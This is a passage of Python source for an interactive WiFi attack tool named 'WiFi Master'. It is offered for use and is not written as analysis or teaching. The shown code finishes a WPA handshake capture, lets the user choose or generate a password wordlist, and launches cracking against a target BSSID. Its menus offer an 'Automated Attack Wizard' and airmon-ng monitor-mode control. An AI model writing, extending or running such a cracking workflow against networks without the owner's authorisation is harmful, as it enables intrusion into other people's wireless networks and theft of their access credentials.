                print(f"\r[~] Waiting for handshake... ({attempt+1}/8 attempts)", end='')
            else:
                time.sleep(4)
        
        # Stop capture
        if cap_process:
            try:
                os.killpg(os.getpgid(cap_process.pid), signal.SIGTERM)
                cap_process.wait(timeout=5)
            except:
                pass
        
        if not handshake_captured:
            self.color_print("\n\n[!] Failed to capture handshake", 'RED')
            self.disable_monitor_mode()
            input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
            return
        
        # Step 6: Select wordlist
        self.print_box("STEP 5: SELECT WORDLIST", [
            "Handshake successfully captured!",
            f"File: {os.path.basename(self.cap_file)}",
            "",
            "Now select a wordlist for password cracking"
        ], 'GREEN', 70)
        
        # Check for existing wordlists
        wordlists = list(Path(self.wordlist_dir).glob("*.txt"))
        if wordlists:
            self.color_print("\n[+] Available wordlists:", 'CYAN')
            for i, wl in enumerate(wordlists, 1):
                size_mb = wl.stat().st_size / (1024 * 1024)
                if size_mb >= 1:
                    size_str = f"{size_mb:.1f} MB"
                else:
                    size_kb = wl.stat().st_size / 1024
                    size_str = f"{size_kb:.0f} KB"
                print(f"  {self.COLORS['CYAN']}[{i}]{self.COLORS['ENDC']} {wl.name:30} ({size_str})")
            
            print(f"  {self.COLORS['CYAN']}[{len(wordlists)+1}]{self.COLORS['ENDC']} Use custom wordlist")
            print(f"  {self.COLORS['CYAN']}[{len(wordlists)+2}]{self.COLORS['ENDC']} Generate new wordlist")
            print(f"  {self.COLORS['RED']}[0]{self.COLORS['ENDC']} Skip cracking (save for later)")
            
            try:
                choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select option: "))
                
                if choice == 0:
                    self.color_print("\n[~] Skipping password cracking", 'YELLOW')
                    self.color_print(f"[~] Handshake saved to: {self.cap_file}", 'CYAN')
                    self.disable_monitor_mode()
                    return
                elif 1 <= choice <= len(wordlists):
                    self.wordlist = str(wordlists[choice-1])
                elif choice == len(wordlists)+1:
                    custom = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Enter custom wordlist path: ")
                    if Path(custom).exists():
                        self.wordlist = custom
                    else:
                        self.color_print("[!] Wordlist not found", 'RED')
                        self.disable_monitor_mode()
                        return
                elif choice == len(wordlists)+2:
                    keywords = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Enter keywords (comma-separated): ").split(',')
                    if keywords:
                        output_name = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Output filename (default: custom.txt): ")
                        if not output_name:
                            output_name = "custom.txt"
                        self.wordlist = self.wordlist_generator(keywords, output_name)
                    else:
                        self.color_print("[!] No keywords provided", 'RED')
                        self.disable_monitor_mode()
                        return
                else:
                    self.color_print("[!] Invalid selection", 'RED')
                    self.disable_monitor_mode()
                    return
            except ValueError:
                self.color_print("[!] Invalid input", 'RED')
                self.disable_monitor_mode()
                return
        else:
            self.color_print("\n[!] No wordlists found in wordlists/ directory", 'YELLOW')
            create = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Generate a wordlist? (y/n): ").lower()
            if create == 'y':
                keywords = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Enter keywords (comma-separated): ").split(',')
                if keywords:
                    self.wordlist = self.wordlist_generator(keywords)
                else:
                    self.color_print("[!] No keywords provided", 'RED')
                    self.disable_monitor_mode()
                    return
            else:
                custom = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Enter custom wordlist path: ")
                if Path(custom).exists():
                    self.wordlist = custom
                else:
                    self.color_print("[!] Wordlist not found", 'RED')
                    self.disable_monitor_mode()
                    return
        
        # Save configuration
        self.save_config()
        
        # Step 7: Start cracking
        self.print_box("FINAL STEP: CRACK PASSWORD", [
            "Starting password cracking...",
            f"Wordlist: {os.path.basename(self.wordlist)}",
            f"Target: {self.bssid}",
            "",
            "This may take a long time depending on wordlist size",
            "Press Ctrl+C to stop cracking"
        ], 'MAGENTA', 70)
        
        # Ask if user wants to disable monitor mode during cracking
        disable_monitor = input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Disable monitor mode during cracking? (y/n): ").lower()
        if disable_monitor == 'y':
            self.disable_monitor_mode()
        
        # Start cracking
        success = self.crack_password(self.cap_file, self.wordlist)
        
        if not success:
            self.color_print("\n[!] Failed to start cracking process", 'RED')
        
        # Ensure monitor mode is disabled
        if self.monitor_interface and disable_monitor != 'y':
            self.disable_monitor_mode()
        
        input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
    
    def toggle_monitor_mode_menu(self):
        """Menu for toggling monitor mode"""
        self.print_box("MONITOR MODE CONTROL", [
            "Toggle monitor mode on wireless interfaces",
            "",
            "Current monitor interfaces:"
        ], 'BLUE', 70)
        
        # Check for monitor interfaces
        result = self.run_command("iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}'", 
                                capture_output=True)
        
        monitor_ifaces = []
        if result and result.stdout:
            monitor_ifaces = [iface for iface in result.stdout.strip().split('\n') if iface]
        
        if monitor_ifaces:
            self.color_print("  Active monitor interfaces:", 'GREEN')
            for iface in monitor_ifaces:
                self.color_print(f"    • {iface}", 'CYAN')
        else:
            self.color_print("  No active monitor interfaces", 'YELLOW')
        
        print(f"\n  {self.COLORS['CYAN']}[1]{self.COLORS['ENDC']} Enable monitor mode on interface")
        print(f"  {self.COLORS['CYAN']}[2]{self.COLORS['ENDC']} Disable all monitor modes")
        print(f"  {self.COLORS['CYAN']}[3]{self.COLORS['ENDC']} Restart NetworkManager")
        print(f"  {self.COLORS['RED']}[0]{self.COLORS['ENDC']} Back")
        
        try:
            choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select option: "))
            
            if choice == 1:
                interfaces = self.list_interfaces()
                if interfaces:
                    try:
                        iface_choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select interface [1-{len(interfaces)}]: "))
                        if 1 <= iface_choice <= len(interfaces):
                            self.enable_monitor_mode(interfaces[iface_choice-1])
                        else:
                            self.color_print("[!] Invalid selection", 'RED')
                    except ValueError:
                        self.color_print("[!] Invalid input", 'RED')
            
            elif choice == 2:
                confirm = input(f"\n{self.COLORS['RED']}[!]{self.COLORS['ENDC']} Disable all monitor modes? (y/n): ")
                if confirm.lower() == 'y':
                    # Disable all monitor interfaces
                    for iface in monitor_ifaces:
                        self.run_command(f"airmon-ng stop {iface}", capture_output=False)
                    self.restart_network_manager()
                    self.monitor_interface = None
                    self.color_print("[✓] All monitor modes disabled", 'GREEN')
            
            elif choice == 3:
                self.restart_network_manager()
            
            elif choice == 0:
                return
            
            else:
                self.color_print("[!] Invalid selection", 'RED')
                
        except ValueError:
            self.color_print("[!] Invalid input", 'RED')
    
    def main_menu(self):
        """Display main menu"""
        while True:
            self.print_header()
            self.print_status()
            
            # Menu options
            menu_items = [
                f"{self.COLORS['CYAN']}[1]{self.COLORS['ENDC']} Automated Attack Wizard",
                f"{self.COLORS['CYAN']}[2]{self.COLORS['ENDC']} Monitor Mode Control",
                f"{self.COLORS['CYAN']}[3]{self.COLORS['ENDC']} Handshake Manager",
                f"{self.COLORS['CYAN']}[4]{self.COLORS['ENDC']} Wordlist Generator",
                f"{self.COLORS['CYAN']}[5]{self.COLORS['ENDC']} Update & Cleanup",
                f"{self.COLORS['CYAN']}[6]{self.COLORS['ENDC']} Network Manager Control",
                f"{self.COLORS['RED']}[7]{self.COLORS['ENDC']} Exit"
            ]
            
            self.print_box("MAIN MENU", menu_items, 'BLUE', 70)
            
            try:
                choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select option: "))
                
                if choice == 1:
                    self.automated_attack()
                elif choice == 2:
                    self.toggle_monitor_mode_menu()
                    input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
                elif choice == 3:
                    self.handshake_manager()
                    input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
                elif choice == 4:
                    keywords = input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Enter keywords (comma-separated): ").split(',')
                    if keywords:
                        output = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Output filename (default: custom.txt): ")
                        if not output:
                            output = "custom.txt"
                        self.wordlist_generator(keywords, output)
                    input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
                elif choice == 5:
                    self.update_dependencies()
                    input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
                elif choice == 6:
                    self.network_manager_control()
                    input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
                elif choice == 7:
                    self.color_print("\n[~] Exiting WiFi Master...", 'CYAN')
                    self.cleanup()
                    self.color_print("[✓] Goodbye!", 'GREEN')
                    break
                else:
                    self.color_print("\n[!] Invalid option", 'RED')
                    time.sleep(1)
            except ValueError:
                self.color_print("\n[!] Invalid input", 'RED')
                time.sleep(1)
            except KeyboardInterrupt:
                self.color_print("\n\n[!] Interrupted", 'YELLOW')
                time.sleep(1)

def main():
    """Main entry point"""
    # Create WiFi Master instance
    wifimaster = WiFiMaster()
    
    # Check for root privileges
    wifimaster.check_root()
    
    # Check dependencies
    if not wifimaster.check_dependencies():
        wifimaster.color_print("\n[!] Please install missing dependencies and try again", 'RED')
        sys.exit(1)
    
    # Start main menu
    try:
        wifimaster.main_menu()
    except KeyboardInterrupt:
        wifimaster.color_print("\n\n[!] Interrupted by user", 'YELLOW')
        wifimaster.cleanup()
    except Exception as e:
        wifimaster.color_print(f"\n[!] Unexpected error: {e}", 'RED')
        wifimaster.cleanup()

if __name__ == "__main__":
    main()